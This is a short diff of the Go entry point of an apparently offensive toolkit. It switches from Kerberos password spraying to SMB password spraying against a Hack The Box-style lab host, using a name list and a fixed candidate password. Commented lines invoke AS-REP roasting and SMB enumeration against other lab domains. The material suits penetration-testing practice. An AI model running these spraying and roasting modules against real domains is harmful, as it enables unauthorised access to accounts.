@@ -1,8 +1,6 @@
 package main
 
-import (
-	"divine-dragon/remote_exploit"
-)
+import "divine-dragon/remote_exploit"
 
 func main() {
 	// asrep_module := remote_exploit.NewASREPRoastingModule("egotistical-bank.local", "10.129.95.180", false, false, false, "", "remote_exploit/names.txt", "", 50, 0)
@@ -19,6 +17,9 @@ func main() {
 	// smb_enum_module := remote_enum.NewSmbModuleNewLdapEnumModule("support.htb", "10.129.86.142", "445", "guest", "", "", true, "")
 	// smb_enum_module.Run()
 
-	kerberosPasswordSprayingModule := remote_exploit.NewKerberosSprayingModule("intelligence.htb", "10.129.95.154", false, false, false, "remote_exploit/names.txt", "NewIntelligenceCorpUser9876", "", 50, 0)
-	kerberosPasswordSprayingModule.Run()
+	// kerberosPasswordSprayingModule := remote_exploit.NewKerberosSprayingModule("intelligence.htb", "10.129.95.154", false, false, false, "remote_exploit/names.txt", "NewIntelligenceCorpUser9876", "", 50, 0)
+	// kerberosPasswordSprayingModule.Run()
+
+	smbPasswordSprayModule := remote_exploit.NewSmbSprayModule("intelligence.htb", "10.129.95.154", "445", "remote_exploit/names.txt", "NewIntelligenceCorpUser9876", false, "", 50, 0)
+	smbPasswordSprayModule.Run()
 }
